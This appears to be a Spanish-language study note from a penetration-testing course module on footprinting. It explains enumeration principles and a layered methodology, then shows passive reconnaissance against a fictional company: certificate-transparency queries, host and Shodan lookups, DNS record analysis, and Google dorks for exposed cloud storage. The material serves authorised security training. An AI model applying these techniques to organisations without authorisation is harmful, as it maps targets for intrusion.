---
tags:
  - HTB-Academy
  - Penetration-Tester
---
[[Footprinting_Module_Cheat_Sheet.pdf]]
# Principios de Enumeración

---

La enumeración es un término ampliamente utilizado en seguridad cibernética. Representa la recopilación de información utilizando métodos activos (escaneos) y pasivos (uso de proveedores externos). Es importante tener en cuenta que OSINT es un procedimiento independiente y debe realizarse por separado de la enumeración porque `OSINT is based exclusively on passive information gathering` y no implica la enumeración activa del objetivo dado. La enumeración es un bucle en el que recopilamos información repetidamente en función de los datos que tenemos o ya hemos descubierto.

La información se puede recopilar a partir de dominios, direcciones IP, servicios accesibles y muchas otras fuentes.

Una vez que hemos identificado objetivos en la infraestructura de nuestros clientes, debemos examinar los servicios y protocolos individuales. En la mayoría de los casos, estos son servicios que permiten la comunicación entre los clientes, la infraestructura, la administración y los empleados.

Si imaginamos que hemos sido contratados para investigar la seguridad de TI de una empresa, comenzaremos a desarrollar una comprensión general de la funcionalidad de la empresa. Por ejemplo, debemos comprender cómo está estructurada la empresa, qué servicios y proveedores externos utiliza, qué medidas de seguridad pueden estar vigentes y más. Aquí es donde esta etapa puede ser un poco mal entendida porque la mayoría de las personas se centran en lo obvio y tratan de abrirse paso en los sistemas de la empresa en lugar de comprender cómo se configura la infraestructura y qué aspectos técnicos y servicios son necesarios para poder ofrecer un servicio específico.

Un ejemplo de un enfoque tan incorrecto podría ser que después de encontrar servicios de autenticación como SSH, RDP, WinRM y similares, tratamos de hacer fuerza bruta con contraseñas y nombres de usuario comunes/débiles. Desafortunadamente, la fuerza bruta es un método ruidoso y puede conducir fácilmente a la lista negra, lo que hace que sea imposible realizar más pruebas. Principalmente, esto puede suceder si no conocemos las medidas de seguridad defensivas de la compañía y su infraestructura. Algunos pueden sonreír ante este enfoque, pero la experiencia ha demostrado que demasiados probadores toman este tipo de enfoque.

`Our goal is not to get at the systems but to find all the ways to get there.`

Podemos pensar en esto como una analogía de un cazador de tesoros que se prepara para su expedición. No solo agarraría una pala y comenzaría a cavar en algún lugar al azar, sino que planificaría y reuniría su equipo y estudiaría mapas y aprendería sobre el terreno que tiene que cubrir y dónde puede estar el tesoro para poder traer las herramientas adecuadas. Si va a cavar agujeros en todas partes, causará daños, perderá tiempo y energía, y probablemente nunca logre su objetivo. Lo mismo se puede decir para comprender la infraestructura interna y externa de una empresa, mapearla y formular cuidadosamente nuestro plan de ataque.

Los principios de enumeración se basan en algunas preguntas que facilitarán todas nuestras investigaciones en cualquier situación concebible. En la mayoría de los casos, el enfoque principal de muchos probadores de penetración está en lo que pueden ver y no en lo que no pueden ver. Sin embargo, incluso lo que no podemos ver es relevante para nosotros y bien puede ser de gran importancia. La diferencia aquí es que empezamos a ver los componentes y aspectos que no son visibles a primera vista con nuestra experiencia.

- ¿Qué podemos ver?
- ¿Qué razones podemos tener para verlo?
- ¿Qué imagen crea lo que vemos para nosotros?
- ¿Qué ganamos con ello?
- ¿Cómo podemos usarlo?
- ¿Qué no podemos ver?
- ¿Qué razones puede haber para que no veamos?
- ¿Qué imagen resulta para nosotros de lo que no vemos?

Un aspecto importante que no debe confundirse aquí es que siempre hay excepciones a las reglas. Los principios, sin embargo, no cambian. Otra ventaja de estos principios es que podemos ver a partir de las tareas prácticas que no nos faltan habilidades de prueba de penetración, sino comprensión técnica cuando de repente no sabemos cómo proceder porque nuestra tarea principal no es explotar las máquinas, sino encontrar cómo pueden ser explotadas.

|**`No.`**|**`Principle`**|
|---|---|
|1.|Hay más de lo que parece. Considere todos los puntos de vista.|
|2.|Distinguir entre lo que vemos y lo que no vemos.|
|3.|Siempre hay formas de obtener más información. Comprende el objetivo.|

Para familiarizarnos con estos principios, debemos escribir estas preguntas y principios donde siempre podamos verlos y referirnos a ellos con facilidad.


# Metodología de Enumeración

---

Los procesos complejos deben contar con una metodología estandarizada que nos ayude a mantenernos orientados y evitar omitir cualquier aspecto por error. Especialmente con la variedad de casos que los sistemas objetivo pueden ofrecernos, es casi impredecible cómo se debe diseñar nuestro enfoque. Por lo tanto, la mayoría de los probadores de penetración siguen sus hábitos y los pasos con los que se sienten más cómodos y familiarizados. Sin embargo, esta no es una metodología estandarizada, sino más bien un enfoque basado en la experiencia.

Sabemos que las pruebas de penetración, y por lo tanto la enumeración, es un proceso dinámico. En consecuencia, hemos desarrollado una metodología de enumeración estática para pruebas de penetración externa e interna que incluye dinámicas libres y permite una amplia gama de cambios y adaptaciones al entorno dado. Esta metodología está anidada en 6 capas y representa, metafóricamente hablando, límites que intentamos pasar con el proceso de enumeración. Todo el proceso de enumeración se divide en tres niveles diferentes:

|`Infrastructure-based enumeration`|`Host-based enumeration`|`OS-based enumeration`|
|---|---|---|

![Diagrama de flujo que ilustra los procesos de enumeración: Basado en SO, basado en host y basado en infraestructura. Incluye configuración del SO, privilegios, procesos, servicios accesibles, puerta de enlace y presencia en Internet, con subcategorías detalladas como tipo de SO, configuración de red, usuarios, tareas, tipo de servicio, firewalls y dominios.](https://academy.hackthebox.com/storage/modules/112/enum-method3.png)

Nota: Los componentes de cada capa que se muestran representan las categorías principales y no una lista completa de todos los componentes a buscar. Además, debe mencionarse aquí que la primera y la segunda capa (Presencia de Internet, Gateway) no se aplican a la intranet, como una infraestructura de Active Directory. Las capas para infraestructura interna estarán cubiertas en otros módulos.

Considere estas líneas como algún tipo de obstáculo, como un muro, por ejemplo. Lo que hacemos aquí es mirar a nuestro alrededor para averiguar dónde está la entrada, o la brecha por la que podemos pasar, o subir para acercarnos a nuestra meta. Teóricamente, también es posible pasar por la pared de cabeza, pero muy a menudo, sucede que el punto que hemos roto la brecha con mucho esfuerzo y tiempo con fuerza no nos trae mucho porque no hay entrada en este punto de la pared para pasar a la siguiente pared.

Estas capas están diseñadas de la siguiente manera:

|**Capa**|**Descripción**|**Categorías de Información**|
|---|---|---|
|`1. Internet Presence`|Identificación de la presencia en Internet y la infraestructura accesible externamente.|Dominios, Subdominios, vHosts, ASN, Netblocks, Direcciones IP, Instancias en la Nube, Medidas de Seguridad|
|`2. Gateway`|Identificar las posibles medidas de seguridad para proteger la infraestructura externa e interna de la empresa.|Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Segmentación de red, VPN, Cloudflare|
|`3. Accessible Services`|Identifique interfaces y servicios accesibles que estén alojados externa o internamente.|Tipo de Servicio, Funcionalidad, Configuración, Puerto, Versión, Interfaz|
|`4. Processes`|Identificar los procesos internos, fuentes y destinos asociados con los servicios.|PID, Datos Procesados, Tareas, Fuente, Destino|
|`5. Privileges`|Identificación de los permisos y privilegios internos a los servicios accesibles.|Grupos, Usuarios, Permisos, Restricciones, Medio ambiente|
|`6. OS Setup`|Identificación de los componentes internos y configuración de sistemas.|Tipo de sistema operativo, Nivel de parche, Configuración de red, Entorno de sistema operativo, Archivos de configuración, archivos privados sensibles|

Nota importante: El aspecto humano y la información que pueden obtener los empleados que usan OSINT se han eliminado de la capa "Presencia de Internet" por simplicidad.

Finalmente podemos imaginar toda la prueba de penetración en forma de laberinto donde tenemos que identificar las brechas y encontrar la manera de meternos lo más rápido y efectivo posible. Este tipo de laberinto puede verse así:

![Círculos concéntricos codificados por colores con líneas y cuadrados de conexión, etiquetados como 'Punto de inicio' que representan un diagrama de flujo o diagrama de proceso.](https://academy.hackthebox.com/storage/modules/112/pentest-labyrinth.png)

Los cuadrados representan los huecos/vulnerabilidades.

Como probablemente ya hemos notado, podemos ver que encontraremos una brecha y muy probablemente varias. El hecho interesante y muy común es que no todas las brechas que encontramos pueden llevarnos dentro. Todas las pruebas de penetración son limitadas en el tiempo, pero siempre debemos tener en cuenta que una creencia de que casi siempre hay una manera de entrar. Incluso después de una prueba de penetración de cuatro semanas, no podemos decir al 100% que no hay más vulnerabilidades. Alguien que ha estado estudiando la compañía durante meses y analizándolas probablemente tendrá una comprensión mucho mayor de las aplicaciones y la estructura de lo que pudimos obtener en las pocas semanas que pasamos en la evaluación. Un ejemplo excelente y reciente de esto es el [ataque cibernético a SolarWinds](https://www.rpc.senate.gov/policy-papers/the-solarwinds-cyberattack), lo que sucedió no hace mucho tiempo. Esta es otra excelente razón para una metodología que debe excluir tales casos.

Supongamos que se nos ha pedido que realicemos una prueba de penetración externa de "caja negra". Una vez que todos los elementos del contrato necesarios se hayan cumplido por completo, nuestra prueba de penetración comenzará en el momento especificado.

---

## Capa No.1: Presencia de Internet

La primera capa que tenemos que pasar es la capa de "Presencia de Internet", donde nos centramos en encontrar los objetivos que podemos investigar. Si el alcance del contrato nos permite buscar hosts adicionales, esta capa es aún más crítica que solo para objetivos fijos. En esta capa, utilizamos diferentes técnicas para encontrar dominios, subdominios, netblocks, y muchos otros componentes e información que presentan la presencia de la empresa y su infraestructura en Internet.

`The goal of this layer is to identify all possible target systems and interfaces that can be tested.`

---

## Capa No.2: Puerta de enlace

Aquí tratamos de entender la interfaz del objetivo alcanzable, cómo está protegido y dónde se encuentra en la red. Debido a la diversidad, las diferentes funcionalidades y algunos procedimientos particulares, entraremos en más detalles sobre esta capa en otros módulos.

`The goal is to understand what we are dealing with and what we have to watch out for.`

---

## Capa No.3: Servicios Accesibles

En el caso de los servicios accesibles, examinamos cada destino para todos los servicios que ofrece. Cada uno de estos servicios tiene un propósito específico que ha sido instalado por una razón particular por el administrador. Cada servicio tiene ciertas funciones, que por lo tanto también conducen a resultados específicos. Para trabajar eficazmente con ellos, necesitamos saber cómo funcionan. De lo contrario, necesitamos aprender a entenderlos.

`This layer aims to understand the reason and functionality of the target system and gain the necessary knowledge to communicate with it and exploit it for our purposes effectively.`

Esta es la parte de la enumeración que trataremos principalmente en este módulo.

---

## Capa No.4: Procesos

Cada vez que se ejecuta un comando o función, se procesan los datos, ya sean ingresados por el usuario o generados por el sistema. Esto inicia un proceso que tiene que realizar tareas específicas, y dichas tareas tienen al menos una fuente y un objetivo.

`The goal here is to understand these factors and identify the dependencies between them.`

---

## Capa No.5: Privilegios

Cada servicio se ejecuta a través de un usuario específico en un grupo particular con permisos y privilegios definidos por el administrador o el sistema. Estos privilegios a menudo nos proporcionan funciones que los administradores pasan por alto. Esto sucede a menudo en las infraestructuras de Active Directory y en muchos otros entornos y servidores de administración específicos de casos donde los usuarios son responsables de múltiples áreas de administración.

`It is crucial to identify these and understand what is and is not possible with these privileges.`

---

## Capa No.6: Configuración del sistema operativo

Aquí recopilamos información sobre el sistema operativo real y su configuración mediante el acceso interno. Esto nos da una buena visión general de la seguridad interna de los sistemas y refleja las habilidades y capacidades de los equipos administrativos de la empresa.

`The goal here is to see how the administrators manage the systems and what sensitive internal information we can glean from them.`

---

## Metodología de Enumeración en la Práctica

Una metodología resume todos los procedimientos sistemáticos para obtener conocimiento dentro de los límites de un objetivo dado. Es importante señalar que una metodología no es una guía paso a paso sino, como la definición implica, un resumen de los procedimientos sistemáticos. En nuestro caso, la metodología de enumeración es el enfoque sistemático para explorar un objetivo dado.

La forma en que se identifican los componentes individuales y la información obtenida en esta metodología es un aspecto dinámico y creciente que cambia constantemente y, por lo tanto, puede diferir. Un excelente ejemplo de esto es el uso de herramientas de recopilación de información de servidores web. Hay innumerables herramientas diferentes para esto, y cada una de ellas tiene un enfoque específico y, por lo tanto, ofrece resultados individuales que difieren de otras aplicaciones. El objetivo, sin embargo, es el mismo. Por lo tanto, la colección de herramientas y comandos no es parte de la metodología real, sino más bien una hoja de trucos a la que podemos referirnos utilizando los comandos y herramientas enumerados en casos dados.


# Información de Dominio

---

La información de dominio es un componente central de cualquier prueba de penetración, y no se trata solo de los subdominios, sino de toda la presencia en Internet. Por lo tanto, recopilamos información y tratamos de comprender la funcionalidad de la empresa y qué tecnologías y estructuras son necesarias para que los servicios se ofrezcan de manera exitosa y eficiente.

Este tipo de información se recopila pasivamente sin escaneos directos y activos. En otras palabras, permanecemos ocultos y navegamos como "clientes" o "visitantes" para evitar conexiones directas con la empresa que podrían exponernos. Las secciones relevantes de OSINT son sólo una pequeña parte de cómo va OSINT en profundidad y describen sólo algunas de las muchas maneras de obtener información de esta manera. Se pueden encontrar más enfoques y estrategias para esto en el módulo [OSINT: Recon Corporativo](https://academy.hackthebox.com/course/preview/osint-corporate-recon).

Sin embargo, cuando `passively` al recopilar información, podemos utilizar servicios de terceros para comprender mejor a la empresa. Sin embargo, lo primero que debemos hacer es analizar la empresa `main website`. Luego, debemos leer los textos, teniendo en cuenta qué tecnologías y estructuras se necesitan para estos servicios.

Por ejemplo, muchas empresas de TI ofrecen desarrollo de aplicaciones, IoT, alojamiento, ciencia de datos y servicios de seguridad de TI, dependiendo de su industria. Si nos encontramos con un servicio con el que hemos tenido poco que ver antes, tiene sentido y es necesario familiarizarse con él y averiguar en qué actividades consiste y qué oportunidades hay disponibles. Esos servicios también nos dan una buena visión general de cómo se puede estructurar la empresa.

Por ejemplo, esta parte es la combinación entre el `first principle` y el `second principle` de enumeración. Prestamos atención a lo que `we see` y `we do not see`. Vemos los servicios pero no su funcionalidad. Sin embargo, los servicios están vinculados a ciertos aspectos técnicos necesarios para proporcionar un servicio. Por lo tanto, tomamos la vista del desarrollador y miramos todo desde su punto de vista. Este punto de vista nos permite obtener muchos conocimientos técnicos sobre la funcionalidad.

---

## Presencia Online

Una vez que tenemos una comprensión básica de la empresa y sus servicios, podemos obtener una primera impresión de su presencia en Internet. Supongamos que una empresa mediana nos ha contratado para probar toda su infraestructura desde una perspectiva de caja negra. Esto significa que solo hemos recibido un alcance de objetivos y debemos obtener toda la información adicional nosotros mismos.

Nota: Recuerde que los ejemplos a continuación diferirán de los ejercicios prácticos y no darán los mismos resultados. Sin embargo, los ejemplos se basan en pruebas de penetración reales e ilustran cómo y qué información se puede obtener.

El primer punto de presencia en Internet puede ser el `SSL certificate` desde el sitio web principal de la compañía que podemos examinar. A menudo, dicho certificado incluye algo más que un subdominio, y esto significa que el certificado se usa para varios dominios, y es muy probable que aún estén activos.

![Validez del certificado del 18 de mayo de 2021 al 6 de abril de 2022, con nombres DNS: inlanefreight.htb, www.inlanefreight.htb, support.inlanefreight.htb.](https://academy.hackthebox.com/storage/modules/112/DomInfo-1.png)

Otra fuente para encontrar más subdominios es [crt.sh](https://crt.sh/). Esta fuente es [Certificado Transparencia](https://en.wikipedia.org/wiki/Certificate_Transparency) registros. La transparencia del certificado es un proceso que tiene como objetivo permitir la verificación de certificados digitales emitidos para conexiones de Internet cifradas. El estándar ([RFC 6962](https://tools.ietf.org/html/rfc6962)) establece el registro de todos los certificados digitales emitidos por una autoridad de certificación en registros a prueba de auditoría. Esto tiene la intención de permitir la detección de certificados falsos o emitidos maliciosamente para un dominio. Proveedores de certificados SSL como [Vamos a Encriptar](https://letsencrypt.org/) comparta esto con la interfaz web [crt.sh](https://crt.sh/), que almacena las nuevas entradas en la base de datos a la que se accederá más adelante.

   

![resultados de búsqueda de Crt.sh para 'inlanefreight.com' que muestran certificados con nombres comunes como matomo.inlanefreight.com, smartfactory.inlanefreight.com y nombres de emisores, incluidos Let's Encrypt y Cloudflare.](https://academy.hackthebox.com/storage/modules/112/DomInfo-2.png)

También podemos emitir los resultados en formato JSON.

#### Certificado Transparencia

  Información de Dominio

```shell-session
vcrdcr@htb[/htb]$ curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .

[
  {
    "issuer_ca_id": 23451835427,
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
    "common_name": "matomo.inlanefreight.com",
    "name_value": "matomo.inlanefreight.com",
    "id": 50815783237226155,
    "entry_timestamp": "2021-08-21T06:00:17.173",
    "not_before": "2021-08-21T05:00:16",
    "not_after": "2021-11-19T05:00:15",
    "serial_number": "03abe9017d6de5eda90"
  },
  {
    "issuer_ca_id": 6864563267,
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
    "common_name": "matomo.inlanefreight.com",
    "name_value": "matomo.inlanefreight.com",
    "id": 5081529377,
    "entry_timestamp": "2021-08-21T06:00:16.932",
    "not_before": "2021-08-21T05:00:16",
    "not_after": "2021-11-19T05:00:15",
    "serial_number": "03abe90104e271c98a90"
  },
  {
    "issuer_ca_id": 113123452,
    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
    "common_name": "smartfactory.inlanefreight.com",
    "name_value": "smartfactory.inlanefreight.com",
    "id": 4941235512141012357,
    "entry_timestamp": "2021-07-27T00:32:48.071",
    "not_before": "2021-07-26T23:32:47",
    "not_after": "2021-10-24T23:32:45",
    "serial_number": "044bac5fcc4d59329ecbbe9043dd9d5d0878"
  },
  { ... SNIP ...
```

Si es necesario, también podemos filtrarlos por los subdominios únicos.

  Información de Dominio

```shell-session
vcrdcr@htb[/htb]$ curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

account.ttn.inlanefreight.com
blog.inlanefreight.com
bots.inlanefreight.com
console.ttn.inlanefreight.com
ct.inlanefreight.com
data.ttn.inlanefreight.com
*.inlanefreight.com
inlanefreight.com
integrations.ttn.inlanefreight.com
iot.inlanefreight.com
mails.inlanefreight.com
marina.inlanefreight.com
marina-live.inlanefreight.com
matomo.inlanefreight.com
next.inlanefreight.com
noc.ttn.inlanefreight.com
preview.inlanefreight.com
shop.inlanefreight.com
smartfactory.inlanefreight.com
ttn.inlanefreight.com
vx.inlanefreight.com
www.inlanefreight.com
```

A continuación, podemos identificar los hosts directamente accesibles desde Internet y no alojados por proveedores externos. Esto se debe a que no se nos permite probar los hosts sin el permiso de proveedores externos.

#### Servidores Alojados de la Empresa

  Información de Dominio

```shell-session
vcrdcr@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

blog.inlanefreight.com 10.129.24.93
inlanefreight.com 10.129.27.33
matomo.inlanefreight.com 10.129.127.22
www.inlanefreight.com 10.129.127.33
s3-website-us-west-2.amazonaws.com 10.129.95.250
```

Una vez que vemos qué hosts se pueden investigar más a fondo, podemos generar una lista de direcciones IP con un ajuste menor a la `cut` ordena y hazles pasar `Shodan`.

[Shodan](https://www.shodan.io/) se puede utilizar para encontrar dispositivos y sistemas conectados permanentemente a Internet como `Internet of Things` (`IoT`). Busca en Internet puertos TCP/IP abiertos y filtra los sistemas de acuerdo con términos y criterios específicos. Por ejemplo, abra puertos HTTP o HTTPS y otros puertos de servidor para `FTP`, `SSH`, `SNMP`, `Telnet`, `RTSP`, o `SIP` se buscan. Como resultado, podemos encontrar dispositivos y sistemas, tales como `surveillance cameras`, `servers`, `smart home systems`, `industrial controllers`, `traffic lights` y `traffic controllers`y varios componentes de red.

#### Shodan - Lista de IP

  Información de Dominio

```shell-session
vcrdcr@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
vcrdcr@htb[/htb]$ for i in $(cat ip-addresses.txt);do shodan host $i;done

10.129.24.93
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T09:02:11.370085
Number of open ports:    2

Ports:
     80/tcp nginx 
    443/tcp nginx 
	
10.129.27.33
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-08-30T22:25:31.572717
Number of open ports:    3

Ports:
     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)
     80/tcp nginx 
    443/tcp nginx 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
				
10.129.27.22
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T15:39:55.446281
Number of open ports:    8

Ports:
     25/tcp  
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3
     53/tcp  
     53/udp  
     80/tcp Apache httpd 
     81/tcp Apache httpd 
    110/tcp  
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2
    111/tcp  
    443/tcp Apache httpd 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
                Fingerprint:   RFC3526/Oakley Group 14
    444/tcp  
		
10.129.27.33
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-08-30T22:25:31.572717
Number of open ports:    3

Ports:
     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)
     80/tcp nginx 
    443/tcp nginx 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
```

Recordamos la IP `10.129.127.22` (`matomo.inlanefreight.com`) para investigaciones activas posteriores que queremos realizar. Ahora, podemos mostrar todos los registros DNS disponibles donde podríamos encontrar más hosts.

#### registros DNS

  Información de Dominio

```shell-session
vcrdcr@htb[/htb]$ dig any inlanefreight.com

; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52058
;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;inlanefreight.com.             IN      ANY

;; ANSWER SECTION:
inlanefreight.com.      300     IN      A       10.129.27.33
inlanefreight.com.      300     IN      A       10.129.95.250
inlanefreight.com.      3600    IN      MX      1 aspmx.l.google.com.
inlanefreight.com.      3600    IN      MX      10 aspmx2.googlemail.com.
inlanefreight.com.      3600    IN      MX      10 aspmx3.googlemail.com.
inlanefreight.com.      3600    IN      MX      5 alt1.aspmx.l.google.com.
inlanefreight.com.      3600    IN      MX      5 alt2.aspmx.l.google.com.
inlanefreight.com.      21600   IN      NS      ns.inwx.net.
inlanefreight.com.      21600   IN      NS      ns2.inwx.net.
inlanefreight.com.      21600   IN      NS      ns3.inwx.eu.
inlanefreight.com.      3600    IN      TXT     "MS=ms92346782372"
inlanefreight.com.      21600   IN      TXT     "atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN"
inlanefreight.com.      3600    IN      TXT     "google-site-verification=O7zV5-xFh_jn7JQ31"
inlanefreight.com.      300     IN      TXT     "google-site-verification=bow47-er9LdgoUeah"
inlanefreight.com.      3600    IN      TXT     "google-site-verification=gZsCG-BINLopf4hr2"
inlanefreight.com.      3600    IN      TXT     "logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc"
inlanefreight.com.      300     IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all"
inlanefreight.com.      21600   IN      SOA     ns.inwx.net. hostmaster.inwx.net. 2021072600 10800 3600 604800 3600

;; Query time: 332 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Mi Sep 01 18:27:22 CEST 2021
;; MSG SIZE  rcvd: 940
```

Veamos lo que hemos aprendido aquí y volvamos a nuestros principios. Vemos un registro IP, algunos servidores de correo, algunos servidores DNS, registros TXT y un registro SOA.

- `A`registros: Reconocemos las direcciones IP que apuntan a un (sub)dominio específico a través del registro A. Aquí solo vemos uno que ya conocemos.
    
- `MX`registros: Los registros del servidor de correo nos muestran qué servidor de correo es responsable de administrar los correos electrónicos de la empresa. Dado que esto es manejado por google en nuestro caso, debemos tener en cuenta esto y omitirlo por ahora.
    
- `NS`registros: Este tipo de registros muestran qué servidores de nombres se utilizan para resolver el FQDN a direcciones IP. La mayoría de los proveedores de alojamiento utilizan sus propios servidores de nombres, lo que facilita la identificación del proveedor de alojamiento.
    
- `TXT` registros: este tipo de registro a menudo contiene claves de verificación para diferentes proveedores externos y otros aspectos de seguridad de DNS, como [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), y [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), que son responsables de verificar y confirmar el origen de los correos electrónicos enviados. Aquí ya podemos ver información valiosa si miramos más de cerca los resultados.
    

  Información de Dominio

```shell-session
...SNIP... TXT     "MS=ms92346782372"
...SNIP... TXT     "atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN"
...SNIP... TXT     "google-site-verification=O7zV5-xFh_jn7JQ31"
...SNIP... TXT     "google-site-verification=bow47-er9LdgoUeah"
...SNIP... TXT     "google-site-verification=gZsCG-BINLopf4hr2"
...SNIP... TXT     "logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc"
...SNIP... TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all"
```

Lo que pudimos ver hasta ahora eran entradas en el servidor DNS, que a primera vista no parecían muy interesantes (a excepción de las direcciones IP adicionales). Sin embargo, no pudimos ver a los proveedores externos detrás de las entradas que se muestran a primera vista. La información central que podemos ver ahora es:

||||
|---|---|---|
|[Atlassiano](https://www.atlassian.com/)|[Google Gmail](https://www.google.com/gmail/)|[LogMeIn](https://www.logmein.com/)|
|[Cartero](https://www.mailgun.com/)|[Perspectiva](https://outlook.live.com/owa/)|[INWX](https://www.inwx.com/en) ID/Nombre de usuario|
|10.129.24.8|10.129.27.2|10.72.82.106|

Por ejemplo, [Atlassiano](https://www.atlassian.com/) afirma que la compañía utiliza esta solución para el desarrollo de software y la colaboración. Si no estamos familiarizados con esta plataforma, podemos probarla de forma gratuita para familiarizarnos con ella.

[Google Gmail](https://www.google.com/gmail/) indica que Google se utiliza para la gestión de correo electrónico. Por lo tanto, también puede sugerir que podríamos acceder a carpetas o archivos GDrive abiertos con un enlace.

[LogMeIn](https://www.logmein.com/) es un lugar central que regula y gestiona el acceso remoto en muchos niveles diferentes. Sin embargo, la centralización de tales operaciones es una espada de doble filo. Si se obtiene acceso como administrador a esta plataforma (por ejemplo, mediante la reutilización de contraseñas), también se tiene acceso completo a todos los sistemas e información.

[Cartero](https://www.mailgun.com/) ofrece varias API de correo electrónico, relés SMTP y webhooks con los que se pueden administrar los correos electrónicos. Esto nos dice que mantengamos los ojos abiertos para las interfaces API que luego podemos probar para detectar varias vulnerabilidades como IDOR, SSRF, POST, solicitudes PUT y muchos otros ataques.

[Perspectiva](https://outlook.live.com/owa/) es otro indicador para la gestión de documentos. Las empresas a menudo usan Office 365 con OneDrive y recursos en la nube como Azure blob y almacenamiento de archivos. El almacenamiento de archivos de Azure puede ser muy interesante porque funciona con el protocolo SMB.

Lo último que vemos es [INWX](https://www.inwx.com/en). Esta empresa parece ser un proveedor de alojamiento donde los dominios se pueden comprar y registrar. El registro TXT con el valor "MS" se usa a menudo para confirmar el dominio. En la mayoría de los casos, es similar al nombre de usuario o ID utilizado para iniciar sesión en la plataforma de administración.


# Recursos en la Nube

---

El uso de la nube, como [AWS](https://aws.amazon.com/), [GCP](https://cloud.google.com/), [Azure](https://azure.microsoft.com/en-us/), y otros, es ahora uno de los componentes esenciales para muchas empresas hoy en día. Después de todo, todas las empresas quieren poder hacer su trabajo desde cualquier lugar, por lo que necesitan un punto central para toda la gestión. Por eso los servicios de `Amazon` (`AWS`), `Google` (`GCP`), y `Microsoft` (`Azure`) son ideales para este propósito.

A pesar de que los proveedores de la nube aseguran su infraestructura de forma centralizada, esto no significa que las empresas estén libres de vulnerabilidades. Sin embargo, las configuraciones realizadas por los administradores pueden hacer que los recursos en la nube de la compañía sean vulnerables. Esto a menudo comienza con el `S3 buckets` (AWS), `blobs` (Azura), `cloud storage` (GCP), a la que se puede acceder sin autenticación si se configura incorrectamente.

#### Servidores Alojados de la Empresa

  Recursos en la Nube

```shell-session
vcrdcr@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

blog.inlanefreight.com 10.129.24.93
inlanefreight.com 10.129.27.33
matomo.inlanefreight.com 10.129.127.22
www.inlanefreight.com 10.129.127.33
s3-website-us-west-2.amazonaws.com 10.129.95.250
```

A menudo, el almacenamiento en la nube se agrega a la lista DNS cuando otros empleados lo usan con fines administrativos. Este paso hace que sea mucho más fácil para los empleados alcanzarlos y administrarlos. Quedémonos con el caso de que una empresa nos haya contratado, y durante la búsqueda de IP, ya hemos visto que una dirección IP pertenece a la `s3-website-us-west-2.amazonaws.com` servidor.

Sin embargo, hay muchas maneras diferentes de encontrar dicho almacenamiento en la nube. Una de las más fáciles y más utilizadas es la búsqueda de Google combinada con Google Dorks. Por ejemplo, podemos usar Google Dorks `inurl:` y `intext:` para limitar nuestra búsqueda a términos específicos. En el siguiente ejemplo, vemos áreas censuradas rojas que contienen el nombre de la empresa.

#### Búsqueda de Google para AWS

   

![Resultados de búsqueda de Google para 'intext: [redacted] inurl:amazonaws.com' que muestran enlaces a archivos PDF de Amazon S3.](https://academy.hackthebox.com/storage/modules/112/gsearch1.png)

#### Búsqueda de Google para Azure

   

![Resultados de búsqueda de Google para 'intext: [redacted] inurl:blob.core.windows.net' que muestran enlaces a archivos PDF en Azure Blob Storage.](https://academy.hackthebox.com/storage/modules/112/gsearch2.png)

Aquí ya podemos ver que los enlaces presentados por Google contienen archivos PDF. Cuando buscamos una empresa que quizás ya conozcamos o queramos conocer, también nos encontraremos con otros archivos como documentos de texto, presentaciones, códigos y muchos otros.

